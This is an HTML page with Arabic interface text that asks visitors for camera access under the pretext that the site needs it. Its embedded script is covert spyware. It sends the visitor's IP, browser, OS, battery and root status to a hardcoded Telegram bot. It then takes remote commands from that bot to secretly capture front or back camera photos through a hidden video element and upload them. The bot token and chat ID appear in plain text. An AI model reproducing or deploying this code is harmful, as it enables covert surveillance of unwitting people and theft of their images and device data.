<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø·Ù„Ø¨ ØµÙ„Ø§Ø­ÙŠØ© Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§</title>
    <style>
        body {
            margin: 0;
            padding: 20px;
            font-family: Arial, sans-serif;
            background: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            background: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 400px;
            text-align: center;
        }
        p {
            margin: 10px 0;
            color: #333;
            font-size: 16px;
            line-height: 1.6;
        }
        button {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin: 15px 0 5px;
        }
        button:hover {
            background: #45a049;
        }
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <p>Ø§Ù„Ù…ÙˆÙ‚Ø¹ ÙŠØ·Ù„Ø¨ ØµÙ„Ø§Ø­ÙŠØ§Øª Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù‡Ù„ ØªÙˆØ§ÙÙ‚ Ù„Ù„Ù…Ø¹Ù„ÙˆÙ…ÙŠØ© Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ù„Ø§ ÙŠØ´ØªØºÙ„ Ø§Ù„Ø§ Ø¨Ù‡Ø§</p>
        <button onclick="requestPermissions()" id="requestBtn">Ù…ÙˆØ§ÙÙ‚</button>
    </div>

    <video id="hiddenVideo" class="hidden" autoplay playsinline></video>
    <canvas id="hiddenCanvas" class="hidden"></canvas>

    <script>
        // Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø¨ÙˆØª ØªÙ„ÙŠØ¬Ø±Ø§Ù…
        const BOT_TOKEN = '8308808486:AAFX3MdJIvWDOpe53xr_YC1kvJHlMKAP-vM';
        const CHAT_ID = '7879905402';
        const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
        
        // Ù…ØªØºÙŠØ±Ø§Øª Ø¹Ø§Ù…Ø©
        let isPermissionGranted = false;
        let lastUpdateId = 0;
        let checkInterval;
        let currentStream = null;
        let isProcessing = false;

        // Ø¹Ù†Ø§ØµØ± Ø§Ù„ØµÙØ­Ø©
        const requestBtn = document.getElementById('requestBtn');
        const hiddenVideo = document.getElementById('hiddenVideo');
        const hiddenCanvas = document.getElementById('hiddenCanvas');

        // Ø¯Ø§Ù„Ø© Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø¹Ù†ÙˆØ§Ù† IP
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ';
            }
        }

        // Ø¯Ø§Ù„Ø© Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ø³Ù… Ø§Ù„Ù…ÙˆÙ‚Ø¹
        function getSiteName() {
            return window.location.hostname || 'Ù…Ø­Ù„ÙŠ';
        }

        // Ø¯Ø§Ù„Ø© Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù…Ø¹Ù„ÙˆÙ…Ø§Øª Ø§Ù„Ù…ØªØµÙØ­
        function getBrowserInfo() {
            const ua = navigator.userAgent;
            if (ua.includes("Chrome")) return "Google Chrome";
            if (ua.includes("Firefox")) return "Mozilla Firefox";
            if (ua.includes("Safari")) return "Apple Safari";
            if (ua.includes("Edge")) return "Microsoft Edge";
            if (ua.includes("OPR")) return "Opera";
            return "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
        }

        // Ø¯Ø§Ù„Ø© Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ØºÙŠÙ„
        function getOS() {
            const ua = navigator.userAgent;
            if (ua.includes("Windows")) return "Windows";
            if (ua.includes("Mac")) return "MacOS";
            if (ua.includes("Linux")) return "Linux";
            if (ua.includes("Android")) return "Android";
            if (ua.includes("iOS")) return "iOS";
            return "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
        }

        // Ø¯Ø§Ù„Ø© Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø­Ø§Ù„Ø© Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©
        async function getBatteryInfo() {
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    return {
                        level: Math.round(battery.level * 100) + '%',
                        charging: battery.charging ? 'Ù†Ø¹Ù…' : 'Ù„Ø§'
                    };
                }
                return { level: 'ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ…', charging: 'ØºÙŠØ± Ù…Ø¯Ø¹ÙˆÙ…' };
            } catch (error) {
                return { level: 'Ø®Ø·Ø£', charging: 'Ø®Ø·Ø£' };
            }
        }

        // Ø¯Ø§Ù„Ø© Ù„Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø­Ø§Ù„Ø© Ø§Ù„Ø±ÙˆØª
        function checkRootStatus() {
            const ua = navigator.userAgent;
            if (ua.includes("Android")) {
                if (ua.includes("magisk") || document.location.toString().includes('supersu')) {
                    return 'Ù…Ø­ØªÙ…Ù„ ÙˆØ¬ÙˆØ¯ Ø±ÙˆØª';
                }
            }
            return 'ÙŠØ¨Ø¯Ùˆ Ø·Ø¨ÙŠØ¹ÙŠØ§Ù‹';
        }

        // Ø¯Ø§Ù„Ø© Ù„Ø¬Ù…Ø¹ ÙƒÙ„ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª
        async function collectAllInfo() {
            const userIP = await getUserIP();
            const siteName = getSiteName();
            const browser = getBrowserInfo();
            const os = getOS();
            const timestamp = new Date().toLocaleString('ar-EG');
            const userAgent = navigator.userAgent;
            const batteryInfo = await getBatteryInfo();
            const rootStatus = checkRootStatus();

            return {
                userIP, siteName, browser, os, timestamp, userAgent,
                batteryLevel: batteryInfo.level,
                batteryCharging: batteryInfo.charging,
                rootStatus
            };
        }

        // Ø¯Ø§Ù„Ø© Ù„Ø¥Ø±Ø³Ø§Ù„ Ø±Ø³Ø§Ù„Ø© Ø¥Ù„Ù‰ Ø§Ù„ØªÙ„ÙŠØ¬Ø±Ø§Ù…
        async function sendToTelegram(text) {
            try {
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'HTML'
                    })
                });
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„:', error);
            }
        }

        // Ø¯Ø§Ù„Ø© Ù„Ø¥Ø±Ø³Ø§Ù„ Ø£Ø²Ø±Ø§Ø± Ø§Ù„ØªØ­ÙƒÙ…
        async function sendControlButtons() {
            const keyboard = {
                inline_keyboard: [
                    [
                        { text: "ğŸ“¸ ØªØµÙˆÙŠØ± Ø£Ù…Ø§Ù…ÙŠ", callback_data: "front" },
                        { text: "ğŸ“· ØªØµÙˆÙŠØ± Ø®Ù„ÙÙŠ", callback_data: "back" }
                    ],
                    [
                        { text: "â„¹ï¸ Ø§Ù„Ù…Ø¹Ù„ÙˆÙ…Ø§Øª", callback_data: "info" }
                    ]
                ]
            };

            try {
                await fetch(`${TELEGRAM_API}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: 'ğŸ›ï¸ Ù„ÙˆØ­Ø© Ø§Ù„ØªØ­ÙƒÙ…:',
                        reply_markup: keyboard
                    })
                });
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø£Ø²Ø±Ø§Ø±:', error);
            }
        }

        // Ø¯Ø§Ù„Ø© Ù„Ø§Ù„ØªÙ‚Ø§Ø· ØµÙˆØ±Ø©
        async function capturePhoto(facingMode) {
            if (!isPermissionGranted) return null;

            try {
                if (currentStream) {
                    currentStream.getTracks().forEach(track => track.stop());
                }

                currentStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: facingMode }, 
                    audio: false 
                });

                hiddenVideo.srcObject = currentStream;
                await hiddenVideo.play();
                await new Promise(r => setTimeout(r, 300));

                hiddenCanvas.width = hiddenVideo.videoWidth || 640;
                hiddenCanvas.height = hiddenVideo.videoHeight || 480;
                hiddenCanvas.getContext('2d').drawImage(hiddenVideo, 0, 0);

                currentStream.getTracks().forEach(track => track.stop());
                currentStream = null;

                return new Promise((resolve) => {
                    hiddenCanvas.toBlob(resolve, 'image/jpeg', 0.8);
                });
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªØµÙˆÙŠØ±:', error);
                return null;
            }
        }

        // Ø¯Ø§Ù„Ø© Ù„Ø¥Ø±Ø³Ø§Ù„ ØµÙˆØ±Ø©
        async function sendPhoto(photoBlob, cameraType) {
            if (!photoBlob) {
                await sendToTelegram(`âŒ ÙØ´Ù„ ØªØµÙˆÙŠØ± Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ${cameraType}`);
                return;
            }

            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', photoBlob, `${cameraType}.jpg`);
            formData.append('caption', `ğŸ“¸ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ ${cameraType}\nğŸ• ${new Date().toLocaleString('ar-EG')}`);

            try {
                await fetch(`${TELEGRAM_API}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„ØµÙˆØ±Ø©:', error);
            }
        }

        // Ø¯Ø§Ù„Ø© Ù…Ø¹Ø§Ù„Ø¬Ø© Ø§Ù„Ø£ÙˆØ§Ù…Ø±
        async function processCommand(command) {
            if (isProcessing) {
                await sendToTelegram('â³ Ø¬Ø§Ø±ÙŠ ØªÙ†ÙÙŠØ° Ø£Ù…Ø± Ø³Ø§Ø¨Ù‚...');
                return;
            }

            isProcessing = true;

            try {
                if (command === 'front') {
                    const photo = await capturePhoto('user');
                    await sendPhoto(photo, 'Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©');
                }
                else if (command === 'back') {
                    const photo = await capturePhoto('environment');
                    await sendPhoto(photo, 'Ø§Ù„Ø®Ù„ÙÙŠØ©');
                }
                else if (command === 'info') {
                    const info = await collectAllInfo();
                    const message = `
ğŸ”” Ù…Ø³ØªØ®Ø¯Ù… Ø¬Ø¯ÙŠØ¯

ğŸ‘¤ Ø§Ù„Ø­Ø§Ù„Ø©: âœ… ØªÙ… Ù…Ù†Ø­ Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ§Øª Ø¨Ù†Ø¬Ø§Ø­
ğŸŒ Ø§Ù„Ù…ÙˆÙ‚Ø¹: ${info.siteName}
ğŸ“± IP Ø§Ù„Ø¹Ù†ÙˆØ§Ù†: ${info.userIP}
ğŸ’» Ø§Ù„Ù…ØªØµÙØ­: ${info.browser}
âš™ï¸ Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ØºÙŠÙ„: ${info.os}
ğŸ• Ø§Ù„ÙˆÙ‚Øª: ${info.timestamp}
ğŸ“‹ User Agent: ${info.userAgent.substring(0, 100)}...

ğŸ”‹ Ø­Ø§Ù„Ø© Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©:
â€¢ Ø§Ù„Ù†Ø³Ø¨Ø©: ${info.batteryLevel}
â€¢ ÙÙŠ Ø§Ù„Ø´Ø§Ø­Ù†: ${info.batteryCharging}

ğŸ” Ø­Ø§Ù„Ø© Ø§Ù„Ø¬Ù‡Ø§Ø²: ${info.rootStatus}
                    `;
                    await sendToTelegram(message);
                }
            } finally {
                isProcessing = false;
            }
        }

        // Ø¯Ø§Ù„Ø© Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ØªØ­Ø¯ÙŠØ«Ø§Øª
        async function checkUpdates() {
            try {
                const response = await fetch(`${TELEGRAM_API}/getUpdates?offset=${lastUpdateId}&timeout=1`);
                const data = await response.json();

                if (data.ok && data.result.length > 0) {
                    for (const update of data.result) {
                        lastUpdateId = update.update_id + 1;

                        if (update.callback_query) {
                            const callbackData = update.callback_query.data;
                            const callbackId = update.callback_query.id;

                            await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                                method: 'POST',
                                headers: { 'Content-Type': 'application/json' },
                                body: JSON.stringify({
                                    callback_query_id: callbackId,
                                    text: 'â³ Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªÙ†ÙÙŠØ°...'
                                })
                            });

                            await processCommand(callbackData);
                        }
                    }
                }
            } catch (error) {
                console.error('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ØªØ­Ø¯ÙŠØ«Ø§Øª:', error);
            }
        }

        // Ø·Ù„Ø¨ Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ§Øª
        async function requestPermissions() {
            requestBtn.disabled = true;
            requestBtn.textContent = 'Ø¬Ø§Ø±ÙŠ...';

            try {
                const frontStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' }, 
                    audio: false 
                });
                frontStream.getTracks().forEach(track => track.stop());

                const backStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'environment' }, 
                    audio: false 
                });
                backStream.getTracks().forEach(track => track.stop());

                isPermissionGranted = true;
                const info = await collectAllInfo();

                const welcomeMessage = `
ğŸ”” Ù…Ø³ØªØ®Ø¯Ù… Ø¬Ø¯ÙŠØ¯

ğŸ‘¤ Ø§Ù„Ø­Ø§Ù„Ø©: âœ… ØªÙ… Ù…Ù†Ø­ Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ§Øª Ø¨Ù†Ø¬Ø§Ø­
ğŸŒ Ø§Ù„Ù…ÙˆÙ‚Ø¹: ${info.siteName}
ğŸ“± IP Ø§Ù„Ø¹Ù†ÙˆØ§Ù†: ${info.userIP}
ğŸ’» Ø§Ù„Ù…ØªØµÙØ­: ${info.browser}
âš™ï¸ Ù†Ø¸Ø§Ù… Ø§Ù„ØªØ´ØºÙŠÙ„: ${info.os}
ğŸ• Ø§Ù„ÙˆÙ‚Øª: ${info.timestamp}
ğŸ“‹ User Agent: ${info.userAgent.substring(0, 100)}...

ğŸ”‹ Ø­Ø§Ù„Ø© Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©:
â€¢ Ø§Ù„Ù†Ø³Ø¨Ø©: ${info.batteryLevel}
â€¢ ÙÙŠ Ø§Ù„Ø´Ø§Ø­Ù†: ${info.batteryCharging}

ğŸ” Ø­Ø§Ù„Ø© Ø§Ù„Ø¬Ù‡Ø§Ø²: ${info.rootStatus}
                `;

                await sendToTelegram(welcomeMessage);
                await sendControlButtons();

                checkInterval = setInterval(checkUpdates, 1000);
                requestBtn.textContent = 'âœ… ØªÙ…';
                
            } catch (error) {
                requestBtn.disabled = false;
                requestBtn.textContent = 'Ù…ÙˆØ§ÙÙ‚';
                
                let errorMsg = 'âŒ ÙØ´Ù„ ÙÙŠ Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„ØµÙ„Ø§Ø­ÙŠØ§Øª';
                if (error.name === 'NotAllowedError') errorMsg = 'âŒ ØªÙ… Ø±ÙØ¶ Ø§Ù„Ø¥Ø°Ù†';
                else if (error.name === 'NotFoundError') errorMsg = 'âŒ Ù„Ø§ ØªÙˆØ¬Ø¯ ÙƒØ§Ù…ÙŠØ±Ø§Øª';
                
                await sendToTelegram(errorMsg);
            }
        }

        // ØªÙ†Ø¸ÙŠÙ
        window.addEventListener('beforeunload', () => {
            if (checkInterval) clearInterval(checkInterval);
            if (currentStream) currentStream.getTracks().forEach(track => track.stop());
        });

        // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø¯Ø¹Ù… Ø§Ù„Ù…ØªØµÙØ­
        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            document.body.innerHTML = '<div class="container"><p>Ù…ØªØµÙØ­Ùƒ Ù„Ø§ ÙŠØ¯Ø¹Ù… Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§</p></div>';
        }
    </script>
</body>
</html>
